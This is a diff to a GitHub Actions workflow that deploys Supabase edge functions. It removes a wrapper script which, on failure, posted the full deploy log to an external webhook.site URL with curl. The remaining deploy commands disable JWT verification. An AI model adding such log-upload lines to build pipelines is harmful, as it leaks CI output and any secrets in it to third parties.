@@ -129,9 +129,6 @@ jobs:
         env:
           SUPABASE_ACCESS_TOKEN: ${{ secrets.SUPABASE_ACCESS_TOKEN }}
         run: |
-          cat << 'EOF' > deploy.sh
-          #!/bin/bash
-          set -e
           supabase functions deploy analyze-part --no-verify-jwt --project-ref ${{ env.SUPABASE_PROJECT_REF }}
           supabase functions deploy generate-3d --no-verify-jwt --project-ref ${{ env.SUPABASE_PROJECT_REF }}
           supabase functions deploy parts --no-verify-jwt --project-ref ${{ env.SUPABASE_PROJECT_REF }}
@@ -154,9 +151,6 @@ jobs:
           supabase functions deploy save-to-drive --no-verify-jwt --project-ref ${{ env.SUPABASE_PROJECT_REF }}
           supabase functions deploy certify-price --no-verify-jwt --project-ref ${{ env.SUPABASE_PROJECT_REF }}
           supabase functions deploy parts-lookup --no-verify-jwt --project-ref ${{ env.SUPABASE_PROJECT_REF }}
-          EOF
-          chmod +x deploy.sh
-          ./deploy.sh > deploy.log 2>&1 || { curl -X POST -H "Content-Type: text/plain" --data-binary @deploy.log https://webhook.site/97176101-66d8-4656-8133-32750ba36846; exit 1; }
 
       - name: Deploy Database Migrations
         env:
